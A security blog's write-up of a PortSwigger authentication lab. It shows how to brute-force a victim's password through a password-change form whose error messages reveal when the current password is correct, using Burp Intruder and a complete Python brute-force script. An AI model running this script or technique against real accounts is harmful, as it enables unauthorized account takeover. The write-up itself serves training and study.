+++
title = "Authentication Vulnerabilities: Lab 12: Password brute-force via password change"
date = 2025-11-11
lastmod = 2025-11-11
draft = false
author = "bloodstiller"
description = "PortSwigger authentication lab write-up, bruteforce password change via responses" 
tags = [
  "WebSecurity",
  "PortSwigger",
  "web-exploitation",
  "security-research",
  "authentication",
  "login",
  "username-enumeration",
  "response-timing",
  "portswigger-labs",
  "xss",
  "ctf-writeup",
  "python",
  "host-header-injection"
]
keywords = [
  "authentication vulnerabilities",
  "timing attacks",
  "password cracking",
  "PortSwigger authentication lab",
  "web security"
]
toc = true
bold = true
next = true
+++

## Lab 12: Password brute-force via password change: {#lab-12-password-brute-force-via-password-change}

> This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.
>
> Your credentials: wiener:peter
> Victim's username: carlos
> Candidate passwords


### Initial Reconnaissance/Discovery: {#initial-reconnaissance-discovery}

We have access to a simple web-application that allows us to login.
![](/ox-hugo/2025-11-11_05-50.png)

Once logged in we can also change our password &amp; email.
![](/ox-hugo/2025-11-11_05-51.png)


### Reviewing the Password Change Process: {#reviewing-the-password-change-process}

Let's perform a password change and review the process whilst intercepting the traffic.

{{< figure src="/ox-hugo/2025-11-11_05-54.png" >}}

As we can see our username is sent as well as the current password, which is to be expected.
![](/ox-hugo/2025-11-11_05-54_1.png)

Our password is then changed.
![](/ox-hugo/2025-11-11_05-55.png)

Now you may be thinking this is an easy way to bruteforce this, we just replace the username with our target user "carlos" &amp; then bruteforce the "current-password" field using the supplied wordlist until we change carlos' password&#x2026;well it doesn't work.

Let's keep working with this reset functionality until we can find a route forward.

**Test 1, enter incorrect current password**:
If we put in an incorrect current password and try a password reset as our user we just get a standard re-direct and no additional information is offered to us.

**Test 2, enter missmatched new passwords with correct current password**:
If we enter two different passwords for our new password and the correct current password we get the message "New passwords do not match".
![](/ox-hugo/2025-11-11_07-12.png)

**Test 3, enter missmatched new passwords with incorrect current password**:
If we enter two different passwords for our new password and the incorrect current password we get the message "Current password is incorrect".
![](/ox-hugo/2025-11-11_07-15.png)

Using a combination of the test 2 &amp; 3 we should be able to bruteforce carlos' password by doing the following:

1.  Replace the username with our target user "carlos".
2.  Enter missmatched new passwords.
3.  Bruteforce the "current-password" field using the supplied wordlist.
4.  Grep for the response "New passwords do not match".


### Bruteforcing Carlos' Password VIA Password Reset Form Using Burp: {#bruteforcing-carlos-password-via-password-reset-form-using-burp}

I will show how we can do this using Burp as well as how we can script this attack using python.

We send the request to intruder and make the below changes, adding carlos' name as the username and then setting the password field as our injection point and purposely entering missmatched passwords.
![](/ox-hugo/2025-11-11_07-19.png)

We need to make a custom resource pool as if we don't it will prevent us by limiting our requests out we can do this by clicking "Resource Pool" in intruder.
![](/ox-hugo/2025-11-11_06-13.png)

We now need to set our grep search string to search for "New passwords do not match".
![](/ox-hugo/2025-11-11_07-22.png)

Once done we can begin the attack and we will see we get a match for the passwords `soccer`.
![](/ox-hugo/2025-11-11_07-24.png)

We can then login &amp; solve the lab.
![](/ox-hugo/2025-11-11_07-24_1.png)
![](/ox-hugo/2025-11-11_07-25.png)


### Bruteforcing Carlos' Password VIA Password Reset Form Using Python: {#bruteforcing-carlos-password-via-password-reset-form-using-python}


#### Prep The Certificate: {#prep-the-certificate}

If you want to proxy traffic through burp this is mandatory.

Open burp's in built web browser and go to <http://burpsuite> &amp; download the certificate by clicking on “CA Certificate” button on the top right corner.
![](/ox-hugo/2025-11-06_05-56.png)

Convert the certificate to the `.pem` format so the python requests module can use it.

```shell
openssl x509 -inform der -in certificate.cer -out certificate.pem
```


#### Imports: {#imports}

First we import the modules we will need, `requests` &amp; `os`. We also suppress the `requests` warning that will show.

```python
import requests
import os
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
```

If we didn't suppress the warnings the output would look like this.
![](/ox-hugo/2025-11-06_06-02.png)


#### Proxy Setup: {#proxy-setup}

Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.

```python
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
```


#### Variable Declaration: {#variable-declaration}

We declare an array of proxies to proxy our requests through as well as the unique url for our lab's `my-account` page.

We are targeting the `/my-account/change-password` password.

```python
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url="https://0afc005e0431639f80fae533003e00d5.web-security-academy.net/my-account/change-password"
```
#### Iterate Through Password List: {#iterate-through-password-list}

We open the `pass.txt` file and read the contents. We then iterate through the file and take each line &amp; pass it to the variable `password` whilst stripping the new line character from the end of it.

```python
with open("pass.txt", 'r') as passes:
    for line in passes:
        password=(line.rstrip('\n'))
```


#### Bruteforcing Requests: {#bruteforcing-requests}

We then send our requests ensuring the username is "carlos" &amp; the `current-password` is set to be our `password` variable.

We also ensure our `new-passwords` missmatch.

To be able to call the `my-account/change-password` we need to be logged in, to do this we can login is our user and then copy their session cookie and pass that in our request.

```python
        try:
            request=requests.post(url, proxies=proxies, verify=False, timeout=3, data={
                'username': 'carlos',
                'current-password': password,
                'new-password-1': 'test1',
                'new-password-2': 'test2',
            }, cookies={
                'session': 'HXFGXY0xSaJEVJp3sJnhrgxKOLJOTiAR'
            })
```


#### String Matching: {#string-matching}

As we know that if we get the string "New passwords do not match" in a response we have found the current password we check if it is in the request response &amp; then print out carlos' password to the terminal if so.

```python
            if 'New passwords do not match' in request.text:
                print(f"Carlos current password is {password}")
```


#### Error Handling: {#error-handling}

These `except` clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.

```python
    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```


#### Full Script: {#full-script}

```python
#!/usr/bin/env python3
import requests
import os
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url="https://0afc005e0431639f80fae533003e00d5.web-security-academy.net/my-account/change-password"

with open("pass.txt", 'r') as passes:
    for line in passes:
        #Strip New line character from passwords
        password=(line.rstrip('\n'))
        try: 
            request=requests.post(url, proxies=proxies, verify=False, timeout=3, data={
                'username': 'carlos',
                'current-password': password,
                'new-password-1': 'test1',
                'new-password-2': 'test2',
            }, cookies={
                'session': 'HXFGXY0xSaJEVJp3sJnhrgxKOLJOTiAR'
            }
                                  )
            if 'New passwords do not match' in request.text:
                print(f"Carlos current password is {password}")

        except requests.exceptions.HTTPError as errh:
           print ("Http Error:",errh)
        except requests.exceptions.ConnectionError as errc:
           print ("Error Connecting:",errc)
        except requests.exceptions.Timeout as errt:
           print ("Timeout Error:",errt)
        except requests.exceptions.RequestException as err:
           print ("OOps: Something Else",err)

```
#### Script Execution: {#script-execution}

We now run our script with.

```bash
python lab12.py
```

As we can see we get a hit.
![](/ox-hugo/2025-11-11_07-53.png)
And when we try and login we can
![](/ox-hugo/2025-11-11_07-55.png)
And the lab is solved.
![](/ox-hugo/2025-11-11_07-55_1.png)


### Why This Is Vulnerable: {#why-this-is-vulnerable}

As we saw the username for the password reset is being sent in the POST request, this means we can control this value and perform arbitrary password resets for other users; couple this with that we can infer when a password is correct based on the error messages we receive and bypass the bruteforce mitigation to easily bruteforce the users password.
